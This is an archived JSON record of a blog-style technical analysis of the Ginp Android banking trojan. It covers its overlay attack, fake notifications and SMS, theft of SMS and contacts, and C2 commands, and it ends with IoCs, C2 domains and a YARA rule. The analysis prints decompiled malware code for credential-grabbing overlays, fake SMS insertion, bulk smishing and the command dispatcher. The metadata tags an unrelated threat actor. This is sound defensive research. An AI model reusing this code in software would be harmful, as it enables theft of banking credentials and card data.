{
    "id": "83f5668a-52de-4086-952b-84cfbdb252a1",
    "created_at": "2023-01-12T15:01:59.42548Z",
    "updated_at": "2025-03-27T02:16:26.031533Z",
    "deleted_at": null,
    "sha1_hash": "58ab02bc2b24c9bd450aa5942ec4e45f196ba6af",
    "title": "2022-09-22 - Technical analysis of Ginp android malware",
    "authors": "",
    "file_creation_date": "2022-10-02T12:21:45Z",
    "file_modification_date": "2022-10-02T12:21:45Z",
    "file_size": 2290439,
    "plain_text": "# Technical analysis of Ginp android malware\n\n**muha2xmad.github.io/malware-analysis/ginp/**\n\n\nSeptember 22, 2022\n\n\n-----\n\n-----\n\n### Muhammad Hasan Ali\n\n#### Malware Analysis learner\n\n 12 minute read\n\n بسم اهلل الرحمن الرحيم\n\n## Unpacking\n\n#### When we open the sample in a decompiler such as jadx-gui, we will see it is nop code and obfuscated code which makes the analysis of the code more harder and it’s an indicator that the sample is packed. And we can use APKiD or droidlysis to detect which packer is it. After running any of the previous tools against the sample, the packer is JsonPacker . We can get the real payload of the malware by using Frida and using this script to hook the running malicous APK in any emulator. Then pull the payload to our host to analyze it. The payload called sFB.json .\n\n## Overlay attack with social engineering flavor\n\n#### The most interesting part in the Ginp android malware is the Overlya attack . After installing the malware, the malware will ask the user- but not politely- to enable\n```\nAccessibility service . The malware will be able to get the content of the screen and\n\n allow any permission the malware needs to do malicious actions.\n\n```\n\n-----\n\n#### After enabling the Accessibility service, the malware will collect information about the installed apps on the device and send it to the C2 server. When a targeted app from the list is opened, the malware will send to the C2 server that the user opened this app then the C2 server sends a command start_inj to the malware to perform Overlay attack and open a WebView to steal login credentials and credit card credentials. The targeted APPs names is found in the payload code.\n\n\n-----\n\n```\n public void onCreate(Bundle bundle0) {\n\n    super.onCreate(bundle0);\n\n    if(this.getIntent().getExtras() != null) {\n\n      this.pkg = this.getIntent().getExtras().getString(\"pkg\");\n\n    }\n\n    Dialog dialog0 = new Dialog(this);\n\n    this.dialog = dialog0;\n\n    dialog0.setContentView(0x7F030001);\n\n    try {\n\n      Window window0 = this.dialog.getWindow();\n\n      if(window0 != null) {\n\n        window0.setBackgroundDrawable(new ColorDrawable(0));\n\n        window0.setLayout(-2, -2);\n\n        window0.setGravity(0x30);\n\n        window0.clearFlags(2);\n\n      }\n\n    }\n\n    catch(NullPointerException unused_ex) {\n\n      return;\n\n    }\n\n    WebView webView0 = (WebView)this.dialog.findViewById(0x7F020000);\n\n    webView0.setWebViewClient(new WebViewClient());\n\n    webView0.loadUrl(this.store.get(this, \"URL\") + \"push.php?pkg=\" + this.pkg);\n\n    ((LinearLayout)this.dialog.findViewById(0x7F020003)).setOnClickListener((/*\nMISSING LAMBDA PARAMETER */) -> {\n\n      if(ActivityWebViewPush.this.dialog.isShowing()) {\n\n        ActivityWebViewPush.this.dialog.dismiss();\n\n      }\n\n      ActivityWebViewPush.this.Tools.startInj(ActivityWebViewPush.this,\nActivityWebViewPush.this.pkg);\n\n      ActivityWebViewPush.this.finishAndRemoveTask();\n\n    });\n\n    this.dialog.setCanceledOnTouchOutside(true);\n\n    this.dialog.show();\n\n    Utils.playNotification(this, 1, false);\n\n    class com.truly.suggest.ActivityWebViewPush.1 implements View.OnClickListener\n{\n\n      @Override // android.view.View$OnClickListener\n\n      public void onClick(View view0) {\n\n        ActivityWebViewPush.this.close(ActivityWebViewPush.this.dialog);\n\n      }\n\n    }\n\n  }\n\n#### But what if the user didn’t opened any targeted apps? Here is the trick, The malware can push a fake notification contains some text for example ` there’s something wrong in your account and you need to check` something to lure the user and the icon of a targeted app so\n\n```\n\n-----\n\n#### that the user opens the target app. This way the malware makes sure that the user will open the app.\n\n\n-----\n\n```\n protected void onHandleIntent(Intent intent0) {\n\n    try {\n\n      int v = (int)System.currentTimeMillis();\n\n      NotificationManager notificationManager0 =\n(NotificationManager)this.getSystemService(\"notification\");\n\n      String s = intent0.getStringExtra(\"title\");\n\n      String s1 = intent0.getStringExtra(\"content\");\n\n      String s2 = intent0.getStringExtra(\"googleIcon\");\n\n      int v1 = s2 == null || (s2.equals(\"true\")) ? 0x7F010001 : 0x7F010000;\n\n      this.Tools.Log(this, \"Showing notification, Title: \" + s + \", Text: \" +\ns1, Boolean.valueOf(true));\n\n      String s3 = \"ch_\" + v;\n\n      if(Build.VERSION.SDK_INT >= 26) {\n\n        NotificationChannel notificationChannel0 = new\nNotificationChannel(s3, s3, 4);\n\n        notificationChannel0.setDescription(\"channel-description\");\n\n        notificationChannel0.enableLights(true);\n\n        notificationChannel0.setLockscreenVisibility(1);\n\n        notificationChannel0.enableVibration(true);\n\n        notificationChannel0.setVibrationPattern(new long[]{100L, 200L, 300L,\n400L, 500L, 400L, 300L, 200L, 400L});\n\n        notificationChannel0.setBypassDnd(true);\n\n        notificationChannel0.setShowBadge(true);\n\n        if(notificationManager0 != null) {\n\nnotificationManager0.createNotificationChannel(notificationChannel0);\n\n        }\n\n        Notification.Builder notification$Builder0 = new\nNotification.Builder(this,\ns3).setSmallIcon(v1).setAutoCancel(true).setBadgeIconType(v1).setLargeIcon(BitmapFacto\n v1)).setContentTitle(s).setChannelId(s3).setContentText(s1);\n\n        if(notificationManager0 != null) {\n\n          notificationManager0.notify(v, notification$Builder0.build());\n\n        }\n\n      }\n\n      else {\n\n        Notification notification0 = new\nNotification.Builder(this).setContentTitle(s).setContentText(s1).setAutoCancel(true).s\n v1)).build();\n\n        if(notificationManager0 != null) {\n\n          notificationManager0.notify(v, notification0);\n\n        }\n\n      }\n\n      try {\n\n        TimeUnit.MILLISECONDS.sleep(30000L);\n\n      }\n\n      catch(InterruptedException unused_ex) {\n\n        return;\n\n      }\n\n\n```\n\n-----\n\n```\n      if(notificationManager0 ! null) {\n\n        notificationManager0.cancelAll();\n\n        return;\n\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return;\n\n    }\n\n  }\n\n\n#### Another trick is to push SMSs to the user contains some text to lure the user to open the targeted app that the malware wants. This mind-blowing and scary at the same time.\n\n```\n\n-----\n\n```\nprivate void WriteSms(String s, String s1) {\n\n    ContentValues contentValues0 = new ContentValues();\n\n    contentValues0.put(\"address\", s1);\n\n    contentValues0.put(\"date\", Long.valueOf(System.currentTimeMillis()));\n\n    contentValues0.put(\"body\", s);\n\n    Boolean boolean0 = Boolean.valueOf(false);\n\n    contentValues0.put(\"read\", boolean0);\n\n    contentValues0.put(\"seen\", boolean0);\n\n    this.getContentResolver().insert(Telephony.Sms.Inbox.CONTENT_URI,\ncontentValues0);\n\n    Intent intent0 = new\nIntent(\"android.provider.Telephony.ACTION_CHANGE_DEFAULT\");\n\n    intent0.putExtra(\"package\", this.store.get(this, \"SMSDefaultApp\"));\n\n    this.startActivityForResult(intent0, 0x14B06);\n\n  }\n\n  @Override // android.app.Activity\n\n  protected void onActivityResult(int v, int v1, Intent intent0) {\n\n    if(v == 0x14B05 && v1 == -1 && (this.Tools.isDefaultSMSApp(this))) {\n      this.WriteSms(this.Body, this.Sender);\n\n    }\n\n    if(v == 0x14B06 && v1 == -1 && !this.Tools.isDefaultSMSApp(this)) {\n\n      try {\n\n        ServiceAccessibility.autoClickForSmsManager = false;\n\n        this.Tools.Log(this, \"Fake SMS has been sent successfully!\",\nBoolean.valueOf(true));\n\n        Handler handler0 = new Handler();\n\n        com.truly.suggest.ActivityGenerateFakeSMS.1\nactivityGenerateFakeSMS$10 = new Runnable() {\n\n          @Override\n\n          public void run() {\n\nActivityGenerateFakeSMS.this.Tools.notifyAndOpenSMS(ActivityGenerateFakeSMS.this);\n\n          }\n\n        };\n\n        this._const.getClass();\n\n        handler0.postDelayed(activityGenerateFakeSMS$10, 30000L);\n\n        this.finishAndRemoveTask();\n\n      }\n\n      catch(Exception unused_ex) {\n\n      }\n\n      return;\n\n    }\n\n  }\n\n  @Override // android.app.Activity\n\n  protected void onCreate(Bundle bundle0) {\n\n    super.onCreate(bundle0);\n\n    if(this.getIntent().getExtras() == null) {\n\n      this.finishAndRemoveTask();\n\n```\n\n-----\n\n```\n      return;\n\n    }\n\n    this.Sender = this.getIntent().getExtras().getString(\"SENDER\");\n\n    this.Body = this.getIntent().getExtras().getString(\"BODY\");\n\n    ServiceAccessibility.autoClickForSmsManager = true;\n\n    if(!this.Tools.isDefaultSMSApp(this)) {\n\n      Intent intent0 = new\nIntent(\"android.provider.Telephony.ACTION_CHANGE_DEFAULT\");\n\n      intent0.putExtra(\"package\", this.getPackageName());\n\n      this.startActivityForResult(intent0, 0x14B05);\n\n      return;\n\n    }\n\n    this.WriteSms(this.Body, this.Sender);\n\n  }\n\n#### The attacker uses social engineering to lure the user to open a specifc app such as banking app by pushing fake notifications or sending SMSs to the messaging app.\n\n When the user open any targeted app and the malware successeded to steal the credential such as login credential or/and credit card credential, the malware labeled this app and don’t perform Overlay attack against this app.\n\n```\n\n-----\n\n```\npublic void onPageFinished(WebView webView0, String s) {\n\n        super.onPageFinished(webView0, s);\n\n        if(s.contains(\"|DONE|\")) {\n\n          try {\n\n            Utils.msg(ActivityInjection.this, \"[Injector] Grabbing on \" +\nActivityInjection.pkg + \" completed.\");\n\n            Context context0 = ActivityInjection.this.mContext;\n\n            ActivityInjection.this.Tools.delInjectablePackage(context0,\nActivityInjection.pkg, Boolean.valueOf(false));\n\n            Context context1 = ActivityInjection.this.mContext;\n\n            ActivityInjection.this.Tools.enableInjections(context1,\nfalse);\n\n            Context context2 = ActivityInjection.this.mContext;\n\n            ActivityInjection.this.store.set(context2, \"LOCKER_PKG\", \"\");\n\n            Context context3 = ActivityInjection.this.mContext;\n\n            ActivityInjection.this.Tools.startHiddenSMS(context3, true);\n\n            if(ActivityInjection.pkg.equals(\"com.android.vending\")) {\n\n              Context context4 = ActivityInjection.this.mContext;\n\nActivityInjection.this.Tools.enableSocialInjection(context4, Boolean.valueOf(false));\n\n            }\n\n          }\n\n          catch(Exception unused_ex) {\n\n            return;\n\n          }\n\n          ActivityInjection.this.finishAndRemoveTask();\n\n        }\n\n}\n\n## Presistance\n\n#### After installing the malware, the malware will hide its icon and only the name of the malware\nMediaPlayer is visible. After enabling the Accessibility service, the malware will\n\n hide the icon and the name of the malware. And if the user goes to the app from the settings, the malware will bring the screen to the Home screen . And disable Play protect, not to label it as malicious and it won’t delete the malware. This happens because you enabled\nAccessibility service, so don’t enable Accessibility service next time.\n protected void onCreate(Bundle bundle0) {\n\n    super.onCreate(bundle0);\n\n    Bundle bundle1 = this.getIntent().getExtras();\n\n    if(bundle1 != null && (bundle1.getBoolean(\"CLOSE\"))) {\n\n      this.Tools.Log(this, \"[Activity Play Protect] Redirecting to Google Play\nServices\", Boolean.valueOf(false));\n\n      this.Tools.goToPlayStoreSomething(this, \"com.google.android.gms\");\n\n      this.finish();\n\n      return;\n\n    }\n\n }\n\n```\n\n-----\n\n## steal SMSs and contacts then smishing\n\n#### The malware will try to steal the stored SMSs from the user’s device. And send them to the C2 server using ALL_SMS command. And the malware will steal all the contacts and send them to the C2 server using GET_CONTACTS command. After stealing the contacts, the malware will try smishing these stolen contacts by sending spam SMSs messages to download malicious APPs using SEND_SMS command.\n\n\n-----\n\n```\n public void run() {\n\n    try {\n\n      String s = this.phoneNumbers;\n\n      if(s != null) {\n\n        boolean z = s.contains(\":\");\n\n        int v = 0;\n\n        if(!z) {\n\n          this.Tools.Log(this.ctx, \"[SMSSender] Sending SMS: \" +\nthis.message + \" to \" + this.phoneNumbers, Boolean.valueOf(false));\n          this.sendMSG(this.phoneNumbers, this.message);\n\n          return;\n\n        }\n\n        String[] arr_s = this.phoneNumbers.split(\":\");\n\n        this.Tools.Log(this.ctx, \"[SMSSender] Sending SMS: \" + this.message +\n\" to \" + arr_s.length + \" numbers.\", Boolean.valueOf(false));\n\n        while(v < arr_s.length) {\n\n          String s1 = arr_s[v];\n\n          Thread.sleep(0x460L);\n\n          this.sendMSG(s1, this.message);\n\n          ++v;\n\n          continue;\n\n          this.Tools.Log(this.ctx, \"[SMSSender] Sending SMS: \" +\nthis.message + \" to \" + this.phoneNumbers, Boolean.valueOf(false));\n          this.sendMSG(this.phoneNumbers, this.message);\n\n          return;\n\n        }\n\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return;\n\n    }\n\n  }\n\n  private void sendMSG(String s, String s1) {\n\n    try {\n\n      SmsManager smsManager0 = SmsManager.getDefault();\n      smsManager0.sendMultipartTextMessage(s, null,\nsmsManager0.divideMessage(s1), null, null);\n\n      this.Tools.Log(this.ctx, \"[SMSSender] Sending SMS: \" + s1 + \" to \" + s,\nBoolean.valueOf(false));\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n\n## Hide SMSs\n\n```\n\n-----\n\n#### The malware will hide SMSs by enabling the malware to be the default messaging app. When the an SMS comes, the malware will receive the SMS and the malware won’t push a notification to the user’s device.\n\n\n-----\n\n```\nprotected void onHandleIntent(Intent intent0) {\n\n    Utils.doWait(1000L);\n\n    Boolean boolean0 = Boolean.valueOf(true);\n\n    if(!Utils.checkAccess(this)) {\n\n      this.Tools.Log(this, \"[ServiceHiddenSMS] Accessibility not running.\",\nboolean0);\n\n      this.store.set(this, \"ENABLE_HIDDEN_SMS\", \"false\");\n\n      this.stopSelf();\n\n      return;\n\n    }\n\n    if(!Utils.hasThisPermission(this, \"sms\")) {\n\n      this.Tools.Log(this, \"[ServiceHiddenSMS] No permissions\", boolean0);\n\n      this.store.set(this, \"ENABLE_HIDDEN_SMS\", \"false\");\n\n      this.stopSelf();\n\n      return;\n\n    }\n\n    ServiceHiddenSMS.isRunning = true;\n\n    try {\n\n      Bundle bundle0 = intent0.getExtras();\n\n      if(bundle0 != null && !bundle0.getBoolean(\"HIDDEN\")) {\n\n        this.setOurAppAsHidden = false;\n\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return;\n\n    }\n\n    this.Tools.Log(this, \"[ServiceHiddenSMS] Starting SMS Manager changer\",\nboolean0);\n\n    int v = 0;\n\n    while(true) {\n\n      String s = Telephony.Sms.getDefaultSmsPackage(this);\n      if((this.setOurAppAsHidden) && (this.Tools.isDefaultSMSApp(this)) ||\n!this.setOurAppAsHidden && !this.Tools.isDefaultSMSApp(this)) {\n\n        this.Tools.Log(this, \"<font color=lime>Current SMS Messanger is: \" +\ns + \"</font>\", boolean0);\n\n        ServiceAccessibility.autoClickForSmsManager = false;\n\n        ServiceHiddenSMS.isRunning = false;\n\n        this.stopSelf();\n\n        return;\n\n      }\n\n      ServiceAccessibility.autoClickForSmsManager = true;\n\n      if(v > 15) {\n\n        this.Tools.Log(this, \"[ServiceHiddenSMS] Too many retries...\",\nboolean0);\n\n        ServiceAccessibility.autoClickForSmsManager = false;\n\n        ServiceHiddenSMS.isRunning = false;\n\n        this.stopSelf();\n\n        return;\n\n```\n\n-----\n\n```\n      }\n\n      this.Tools.Log(this, \"[ServiceHiddenSMS] Asking for SMS Change\",\nBoolean.valueOf(false));\n\n      ++v;\n\n      if(this.setOurAppAsHidden) {\n\n        Intent intent1 = new\nIntent(\"android.provider.Telephony.ACTION_CHANGE_DEFAULT\");\n\n        intent1.addFlags(0x10000000);\n\n        intent1.addFlags(0x40000000);\n\n        intent1.putExtra(\"package\", this.getPackageName());\n\n        this.startActivity(intent1);\n\n      }\n\n      else {\n\n        Intent intent2 = new\nIntent(\"android.provider.Telephony.ACTION_CHANGE_DEFAULT\");\n\n        intent2.addFlags(0x10000000);\n\n        intent2.addFlags(0x40000000);\n\n        intent2.putExtra(\"package\", this.store.get(this, \"SMSDefaultApp\"));\n\n        this.startActivity(intent2);\n\n      }\n\n      Utils.doWait(2000L);\n\n    }\n\n  }\n\n## Commands\n\n#### These are not all the commands which are recived by the malware from the C2 server such as\n\n```\n\n-----\n\n```\n try {\n\n        JSONObject jSONObject2 = new JSONObject(s5);\n\n        if(jSONObject2.has(\"COMMAND\")) {\n\n          String s6 = jSONObject2.getString(\"COMMAND\");\n\n          RunnablePingServer.errorsCount = 0;\n\n          if(s6.equals(\"NEW_URL\")) { // Update the C2 server URL\n\n            String s7 = jSONObject2.getString(\"URL\");\n\n            globalService0.Tools.Log(globalService0, \"[COMMANDS] Set new\nURL to: \" + s7, Boolean.valueOf(true));\n\n            globalService0.store.set(globalService0, \"URL\", s7);\n\n          }\n\n          else if(s6.equals(\"CHANGE_URL\")) {\n\n            String s8 = jSONObject2.getString(\"URL\");\n\n            globalService0.Tools.changeMainURL(globalService0, s8);\n\n          }\n\n          else if(s6.equals(\"TAKE_SCREENSHOT\")) {\n\n            globalService0.Tools.takeScreenshot(globalService0);\n\n          }\n\n          else if(s6.equals(\"UNLOCK_PLAYSTORE\")) { //disable play protect\n\n            globalService0.Tools.unlockPlayStore(globalService0);\n\n          }\n\n          else if(s6.equals(\"SAVE_LOGCAT\")) { // save logs file from the\ndevice\n\n            globalService0.Tools.saveLogCat(globalService0);\n\n          }\n\n          else if(s6.equals(\"KILL\")) { // to disable the bot\n\n            globalService0.Tools.killBot(globalService0);\n\n          }\n\n          else {\n\n            boolean z1 = s6.equals(\"START_INJ\"); // start performing the\noverlay attack\n\n            if(z1) {\n\n              String s11 = jSONObject2.getString(\"PKG\");\n\n              globalService0.Tools.startInj(globalService0, s11);\n\n            }\n\n            else if(s6.equals(\"START_APP\")) { // to open any app\n\n              String s12 = jSONObject2.getString(\"PKG\");\n\n              globalService0.Tools.startApp(globalService0, s12);\n\n            }\n\n            else if(s6.equals(\"GET_APPS\")) {// get installed apps on the\ndevice\n\n              globalService0.Tools.getInstalledApps(globalService0);\n\n            }\n\n            else if(s6.equals(\"UNINSTALL_APP\")) { // uninstall any\nspecific app\n\n              String s13 = jSONObject2.getString(\"PKG\");\n\n              String s14 = jSONObject2.getString(\"SELF\");\n\n              globalService0.Tools.uninstall(globalService0, s13, s14);\n\n            }\n\n          }\n\n          else {\n\n              boolean z2 = s6.equals(\"TRACKING_ON\"); // Track the\n\n```\n\n-----\n\n```\nmovement of the user\n\n              if(z2) {\n\n                globalService0.store.set(globalService0,\n\"NOTIFY_PKG_CHANGE\", \"true\");\n\n                Utils.msg(globalService0, \"Tracking movement is ON\");\n\n              }\n\n              else if(s6.equals(\"TRACKING_OFF\")) { // stop tracking\n\n                globalService0.store.set(globalService0,\n\"NOTIFY_PKG_CHANGE\", \"false\");\n                Utils.msg(globalService0, \"Tracking movement is\nOFF\");\n\n              }\n\n              else if(s6.equals(\"CLEAN_AV\")) { // uninstall AV if found\n\n                globalService0.Tools.uninstall_av(globalService0);\n\n              }\n\n              else if(s6.equals(\"START_PERMISSIONS\")) { // start\nallowing permissions\n\nglobalService0.Tools.startPermissionsNoDoze(globalService0);\n\n              }\n\n              else if(s6.equals(\"START_PERMISSIONS2\")) {\n\nglobalService0.Tools.startPermissions(globalService0);\n\n              }\n\n              else if(s6.equals(\"START_ADVANCED_PERMISSIONS\")) {\n\nglobalService0.Tools.startPermissions2(globalService0);\n\n              }\n\n              else if(s6.equals(\"DISABLE_ACCESSIBILITY\")) { // disable\naccessibility\n\nglobalService0.Tools.enableAppProtection(globalService0, false);\n\n              }\n\n              else if(s6.equals(\"ENABLE_ACCESSIBILITY\")) {\n\nglobalService0.Tools.enableAppProtection(globalService0, true);\n\n              }\n\n              else if(s6.equals(\"ENABLE_MOBILE_DATA\")) { // to enable\nmobile data\n\n                Utils.popUpMobileData(this);\n\n              }\n\n              else if(s6.equals(\"GET_CONTACTS\")) { // send contacts to\nthe C2 server\n\n                globalService0.Tools.getAllContacts(globalService0);\n\n              }\n\n              else if((s6.equals(\"SEND_SMS\")) &&\n(Utils.hasThisPermission(globalService0, \"sms\"))) { // send messages to the stolen\nnumbers\n\n                String s16 = jSONObject2.getString(\"SEND_TO\");\n\n                String s17 = jSONObject2.getString(\"SEND_MSG\");\n\n                globalService0.Tools.SendSMSMessage(globalService0,\ns16, s17);\n\n```\n\n-----\n\n```\n              }\n\n              else if(s6.equals(\"ALL_SMS\")) { // send the stored SMSs\non the user device to the C2 server\n\n                globalService0.Tools.getAllSMS(globalService0);\n\n              }\n\n              else if(s6.equals(\"ENABLE_HIDDEN_SMS\")) { // hide the\nSMSs by seting the malware as default messageing app\n\n                globalService0.Tools.startHiddenSMS(globalService0,\ntrue);\n\n              }\n\n              else if(s6.equals(\"DISABLE_HIDDEN_SMS\")) {\n\n                globalService0.Tools.startHiddenSMS(globalService0,\nfalse);\n\n              }\n\n              else if(s6.equals(\"STOP_SERVICE_LISTENER\")) {\n\n                ServiceNLStarter.stopMe = true;\n\n              }\n\n          }\n\n           else {\n\n                boolean z3 = s6.equals(\"START_LOCK\");\n\n                if(z3) {\n\n                  String s18 = jSONObject2.getString(\"PKG\");\n\n                  globalService0.store.set(globalService0,\n\"LOCKER_PKG\", s18);\n\n                  globalService0.Tools.startLocker(globalService0);\n\n                }\n\n                else {\n\n                  boolean z4 = s6.equals(\"START_APP_LOCK\");\n\n                  if(z4) {\n\n                    String s19 = jSONObject2.getString(\"PKG\");\n\n                    globalService0.store.set(globalService0,\n\"LOCKER_APP\", s19);\n\nglobalService0.Tools.startAppLocker(globalService0);\n\n                  }\n\n                  else if(s6.equals(\"STOP_LOCK\")) {\n\n                    globalService0.store.set(globalService0,\n\"LOCKER_PKG\", \"\");\n\n                  }\n\n                  else if(s6.equals(\"STOP_APP_LOCK\")) {\n\n                    globalService0.store.set(globalService0,\n\"LOCKER_APP\", \"\");\n\n                  }\n\n                  else if(s6.equals(\"READ_INJECTS\")) { // read the\nlist of targeted apps\n\nglobalService0.Tools.readInjects(globalService0);\n\n                  }\n\n                  else if(s6.equals(\"WRITE_INJECTS\")) { // add to\nthe list of targeted apps\n\n                    String s22 = jSONObject2.getString(\"INJ\");\n\n```\n\n-----\n\n```\nglobalService0.Tools.writeInjects(globalService0, s22);\n\n                  }\n\n                    else {\n\n                      boolean z6 = s6.equals(\"BLOCK_SETTINGS\");\n\n                      if(s6.equals(\"ENABLE_INJECT\")) { //\nenable ijection to perform overlay attack\n\nglobalService0.Tools.enableInjections(globalService0, true);\n\n                      }\n\n                      else if(s6.equals(\"DISABLE_INJECT\")) {\n\nglobalService0.Tools.enableInjections(globalService0, false);\n                      }\n\n                      else {\n\n                        boolean z7 =\ns6.equals(\"ENABLE_CC_GRABBER\"); // enable overlay attack over google play to get CC\n\n                        if(z7) {\n\nglobalService0.Tools.addInjectablePackage(globalService0, \"com.android.vending\",\nBoolean.valueOf(false));\n\n                        }\n\n                        else\nif(s6.equals(\"DISABLE_CC_GRABBER\")) {\n\nglobalService0.Tools.delInjectablePackage(globalService0, \"com.android.vending\",\nBoolean.valueOf(false));\n\n                        }\n\n                        else\nif(s6.equals(\"ADD_INJECT_PACKAGE\")) {\n\n                          String s25 =\njSONObject2.getString(\"PKG\");\n\n                          if(s25.length() > 2) {\n\nglobalService0.Tools.addInjectablePackage(globalService0, s25,\nBoolean.valueOf(true));\n\n                          }\n\n                        }\n\n                        else if(s6.equals(\"INSERT_SMS\")) { //\nwrite a message to send to as a fake message to lure the user to open the app\n\n                          String s28 =\njSONObject2.getString(\"SENDER\");\n\n                          String s29 =\njSONObject2.getString(\"BODY\");\n\nglobalService0.Tools.fakesms(globalService0, s28, s29);\n\n                        }\n\n                          }\n\n                          else if(s6.equals(\"PUSH\")) { //\nto push a fake notification\n\n                            Intent intent0 = new\nIntent(globalService0, ____ServiceShowNotification.class);\n\n                            intent0.putExtra(\"title\",\n\n```\n\n-----\n\n```\njSONObject2.getString( TITLE ));\n\n                            intent0.putExtra(\"content\",\njSONObject2.getString(\"CONTENT\"));\n\nintent0.putExtra(\"googleIcon\", jSONObject2.getString(\"GOOGLE_ICON\"));\n\nglobalService0.startService(intent0);\n\n                          }\n\n                          else if(s6.equals(\"PUSH_NOTIFY\"))\n{\n\n                            String s33 =\njSONObject2.getString(\"PKG\");\n\nglobalService0.Tools.showPushNotify(globalService0, s33);\n\n                          }\n\n                        }\n\n## IoC\n\n#### APK hash: 0ea7462bec3d1f3166513468b8f0df4cbce347a12985337bc07880889003d348\n\n Payload (sFB.json) hash:\n\n```\n```\n4f731ee9f2785ebeb155edebd23d14e555c9bf4758fa7f02db634d55f9441710\n\n```\n\n#### C2 server:\n\n http://advancedbuffs.top/\n\n http://insideluck.cc/\n\n greedythomas[.]top\n\n## Yara\n\n\n-----\n\n```\nrule Ginp {\n\n meta:\n\n  author   = \"@muha2xmad\"\n\n  date    = \"2022-09-21\"\n\n  description = \"Ginp android malware\"\n\n  version   = \"1.0\"\n\n strings:\n\n // packed sample strings\n\n  $unp1 = \"com.common.note\" nocase\n\n  $unp2 = \"com.truly.suggest\" nocase\n\n  $unp3 = \"/download-protection\" nocase\n\n  $unp4 = \"com.truly.suggest.ServiceAccessibility\" nocase\n  $unp5 = \"com.truly.suggest.useless.____ServiceShowNotification\" nocase\n\n  $unp6 = \"com.truly.suggest.ServiceHiddenSMS\" nocase\n\n  $unp7 = \"com.truly.suggest.ServiceMessenger\" nocase\n\n  $unp8 = \"com.truly.suggest.ServiceInjectLocker\" nocase\n\n  // payload strings\n\n  $p1 = \"api202\" nocase\n\n  $p2 = \"mp32\" nocase\n\n  $p3 = \"2.8f\" nocase\n\n  $p4 = \"http://advancedbuffs.top/\" nocase\n\n  $p5 = \"http://insideluck.cc/\" nocase\n\n  $p6 = \"getFile_b0bffe7506764da001745457d16fe6e8.php\" nocase\n\n  $p7 = \"getPhoto_b0bffe7506764da001745457d16fe6e8.php\" nocase\n\n  $p8 = \"greedythomas.top\" nocase\n\n condition:\n\n  uint32be(0) == 0x504B0304 // APK file signature\n\n   and ((all of ($unp*)) or (all of ($p*)))\n\n}\n\n## Article quote\n\n#### يا نافخا على القمر لتطفئه، خارت قواك ولم يدر بك القمر\n\n## REF\n\n#### ThreatFabric analysis on Ginp\n\n securityintelligence analysis on Ginp\n\n droidlysis\n\n APKiD\n\n Frida\n\n```\n\n-----\n\n#### script\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-22 - Technical analysis of Ginp android malware.pdf"
    ],
    "report_names": [
        "2022-09-22 - Technical analysis of Ginp android malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535719,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1664713305,
    "ts_modification_date": 1664713305,
    "files": {
        "pdf": "https://archive.orkl.eu/58ab02bc2b24c9bd450aa5942ec4e45f196ba6af.pdf",
        "text": "https://archive.orkl.eu/58ab02bc2b24c9bd450aa5942ec4e45f196ba6af.txt",
        "img": "https://archive.orkl.eu/58ab02bc2b24c9bd450aa5942ec4e45f196ba6af.jpg"
    }
}